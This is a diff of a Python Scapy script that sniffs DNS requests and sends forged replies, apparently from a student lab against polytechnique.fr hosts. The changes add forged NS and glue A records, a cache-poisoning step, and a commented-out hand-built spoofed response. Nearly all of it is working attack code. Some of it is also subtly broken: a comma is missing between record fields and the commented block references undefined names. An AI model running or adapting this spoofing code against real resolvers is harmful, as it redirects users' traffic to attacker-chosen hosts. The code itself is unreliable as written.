@@ -7,12 +7,8 @@ class entier:
         self.val += 1
 i = entier()
 
-"""paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
-paquet[IP].src='0.0.0.0'
-paquet[IP].dst='0.0.0.0'
-paquet[DNS].an[0].rrname='salut.org'
-paquet[DNS].an[0].rdata='0.0.0.0'"""
-ip_autorite = '1.1.1.1' # change me
+
+ip_autorite = '129.104.32.41' # change me
 
 def maFonction(a):
     i.inc()
@@ -20,10 +16,32 @@ def maFonction(a):
     if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
         msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
+        """rrname=a[DNS].qd[0].qname
+        id=a[DNS].id
+        d = DNS()
+        d.qr = 1      #1 for Response
+        d.opcode = 16
+        d.aa = 0
+        d.tc = 0
+        d.rd = 0
+        d.ra = 1
+        d.z = 8
+        d.rcode = 0
+        d.qdcount = 1      #Question Count
+        d.ancount = 1      #Answer Count
+        d.nscount = 0      #No Name server info
+        d.arcount = 0      #No additional records
+        d.qd = str(a[DNS].qd)
+        d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
+        d.ns = DNSRR(rrname = DOMAIN, type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
+        d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
+        sendp(spoofed, iface_hint=src)"""
         spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst)/\
                       UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                       DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1, \
-                      an=DNSRR(rrname=a[DNS].qd.qname,  ttl=10, rdata='129.104.221.35'))
+                      an = DNSRR(rrname=a[DNS].qd.qname,  ttl=10, rdata='129.104.221.35'), \
+                      ar = DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite) \
+                      ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr"))
         send(spoofed_pkt)
 
     if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
